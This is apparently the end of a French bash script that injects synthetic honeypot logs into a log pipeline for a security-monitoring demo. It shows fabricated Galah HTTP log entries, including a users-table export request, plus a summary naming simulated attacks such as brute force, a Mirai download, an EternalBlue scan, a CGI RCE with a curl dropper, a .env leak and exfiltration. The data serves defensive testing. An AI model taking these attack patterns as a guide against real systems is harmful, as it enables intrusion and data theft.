{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"curl/7.68.0\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h14\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/api/v2/export?format=csv&table=users\",\"sessionID\":\"priv2_s01\",\"userAgent\":\"curl/7.68.0\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/csv\",\"Server\":\"nginx/1.18.0\"},\"body\":\"id,name,email,password_hash\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T11}\",\"srcIP\":\"192.168.1.77\",\"srcHost\":\"\",\"srcPort\":\"55002\",\"tags\":null}
{\"level\":\"error\",\"msg\":\"failedResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8888\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"python-requests/2.25\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h15\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/health\",\"sessionID\":\"priv3_s01\",\"userAgent\":\"python-requests/2.25\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"application/json\",\"Server\":\"Flask\"},\"body\":\"{\\\"status\\\":\\\"ok\\\"}\"},\"responseMetadata\":{\"generationSource\":\"cache\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T12}\",\"srcIP\":\"10.0.1.100\",\"srcHost\":\"\",\"srcPort\":\"60001\",\"tags\":null}
EOF
echo 'OK: 12 lignes Galah injectées'
"

echo -e "  ${GREEN}✓ Galah — 3 IPs publiques + 3 IPs privées${NC}"
echo -e "    ${CYAN}PUB1${NC} 45.142.212.100  → Nuclei scanner (wp-admin + phpmyadmin + SQLi)"
echo -e "    ${CYAN}PUB2${NC} 89.248.167.131  → Zgrab (fingerprint + config.php.bak leak)"
echo -e "    ${CYAN}PUB3${NC} 198.199.70.24   → RCE via CGI (id + curl dropper)"
echo -e "    ${MAGENTA}PRIV1${NC} 172.20.0.10   → API enumeration + .env leak"
echo -e "    ${MAGENTA}PRIV2${NC} 192.168.1.77  → backup.zip + export users CSV"
echo -e "    ${MAGENTA}PRIV3${NC} 10.0.1.100    → health check (CI/CD pipeline)"
echo ""

# ════════════════════════════════════════════════════════════════
# RÉSUMÉ FINAL
# ════════════════════════════════════════════════════════════════
echo -e "${BOLD}${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${GREEN}║              Injection terminée avec succès !                ║${NC}"
echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BOLD}Récapitulatif des IPs injectées :${NC}"
echo ""
echo -e "  ${BOLD}COWRIE${NC} (SSH/Telnet)"
echo -e "   ${CYAN}Pub${NC}  185.220.101.55  → Tor exit — brute force + Mirai download"
echo -e "   ${CYAN}Pub${NC}  194.165.16.76   → Shodan — scan léger"
echo -e "   ${CYAN}Pub${NC}  45.146.164.110  → Botnet Mirai — attaque Telnet IoT"
echo -e "   ${MAGENTA}Priv${NC} 192.168.1.100  → menace interne faible"
echo -e "   ${MAGENTA}Priv${NC} 10.0.0.55      → ${RED}mouvement latéral + exfiltration${NC}"
echo -e "   ${MAGENTA}Priv${NC} 172.16.5.22    → curiosité dev"
echo ""
echo -e "  ${BOLD}DIONAEA${NC} (Multi-protocole)"
echo -e "   ${CYAN}Pub${NC}  91.92.251.103   → SMB + MSSQL + MySQL + HTTP"
echo -e "   ${CYAN}Pub${NC}  205.210.31.229  → EternalBlue scan (SMB x4 + RPC)"
echo -e "   ${CYAN}Pub${NC}  80.82.77.33     → Shodan scan multi-port"
echo -e "   ${MAGENTA}Priv${NC} 10.10.0.200    → SMB latéral interne"
echo -e "   ${MAGENTA}Priv${NC} 192.168.0.15   → accès DB interne suspect"
echo -e "   ${MAGENTA}Priv${NC} 172.16.1.50    → SMB depuis serveur fichiers"
echo ""
echo -e "  ${BOLD}GALAH${NC} (HTTP LLM)"
echo -e "   ${CYAN}Pub${NC}  45.142.212.100  → Nuclei (wp-admin + SQLi)"
echo -e "   ${CYAN}Pub${NC}  89.248.167.131  → Zgrab fingerprint + config leak"
echo -e "   ${CYAN}Pub${NC}  198.199.70.24   → RCE CGI + dropper"
echo -e "   ${MAGENTA}Priv${NC} 172.20.0.10    → API enum + .env"
echo -e "   ${MAGENTA}Priv${NC} 192.168.1.77   → backup + export users"
echo -e "   ${MAGENTA}Priv${NC} 10.0.1.100     → CI/CD health check"
echo ""
echo -e "${YELLOW}Attends 15-30 secondes que Filebeat/Logstash traitent les logs...${NC}"
echo -e "${YELLOW}Puis lance : ${BOLD}bash demo_verify.sh${NC}"
echo ""